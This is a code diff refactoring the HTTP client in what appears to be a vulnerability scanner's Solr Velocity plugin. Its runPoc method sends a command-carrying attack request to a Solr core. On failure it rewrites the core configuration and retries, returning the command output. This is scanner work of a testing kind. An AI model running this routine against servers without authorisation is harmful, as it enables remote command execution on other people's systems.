@@ -1,17 +1,17 @@
 package com.gbw.scanner.plugins.scripts.web.solr.velocity;
 
 import com.gbw.scanner.Host;
+import com.gbw.scanner.http.GBWHttpResponse;
 import com.gbw.scanner.plugins.scripts.web.solr.GBWScanSolrScript;
 import com.gbw.scanner.plugins.scripts.web.solr.GBWScanSolrScriptConfig;
 import com.gbw.scanner.plugins.scripts.web.solr.SolrCoreAdmin;
 import com.gbw.scanner.plugins.scripts.web.solr.SolrHttpRequestBuilder;
 import com.gbw.scanner.sink.SinkQueue;
+import com.gbw.scanner.utils.HttpUtils;
+import org.apache.http.client.methods.HttpUriRequest;
+import org.apache.http.impl.client.CloseableHttpClient;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
-
-import java.net.http.HttpClient;
-import java.net.http.HttpRequest;
-import java.net.http.HttpResponse;
 
 public class GBWScanSolrVelocityScript extends GBWScanSolrScript {
 
@@ -27,25 +27,28 @@ public class GBWScanSolrVelocityScript extends GBWScanSolrScript {
     }
 
 
-    public String runPoc(HttpClient httpClient,Host host,String core){
+    public String runPoc(CloseableHttpClient httpClient, Host host, String core){
 
-        HttpResponse httpResponse;
-        HttpRequest httpRequest = SolrHttpRequestBuilder.makeSolrCoreAttackRequest(host.getServer(),host.getPort(),core,config.getCmd(),true,config.getConTimeout());
+        GBWHttpResponse httpResponse;
+        HttpUriRequest httpRequest = SolrHttpRequestBuilder.makeSolrCoreAttackRequest(host,config,core);
         try {
 
-            httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());
-            if(httpResponse.statusCode() == 200){
+            httpResponse = HttpUtils.send(httpClient,httpRequest,true);
+            if(httpResponse.getStatus() == 200){
                 /*is ok*/
-                return (String)httpResponse.body();
+                return httpResponse.getContent();
             }else {
 
                 /*try to config and try again*/
-                httpRequest = SolrHttpRequestBuilder.makeSolrCoreConfigPostRequest(host.getServer(),host.getPort(),core,config.getConTimeout());
-                httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());
-                httpRequest = SolrHttpRequestBuilder.makeSolrCoreAttackRequest(host.getServer(),host.getPort(),core,config.getCmd(),config.isEncode(),config.getConTimeout());
-                httpResponse = httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());
-                if(httpResponse.statusCode() == 200)
-                    return (String)httpResponse.body();
+                httpRequest = SolrHttpRequestBuilder.makeSolrCoreConfigPostRequest(host,config,core);
+                HttpUtils.send(httpClient,httpRequest);
+
+                httpRequest = SolrHttpRequestBuilder.makeSolrCoreAttackRequest(host,config,core);
+
+                httpResponse = HttpUtils.send(httpClient,httpRequest,true);
+
+                if(httpResponse.getStatus() == 200)
+                    return httpResponse.getContent();
             }
         } catch (Exception e) {
             e.printStackTrace();
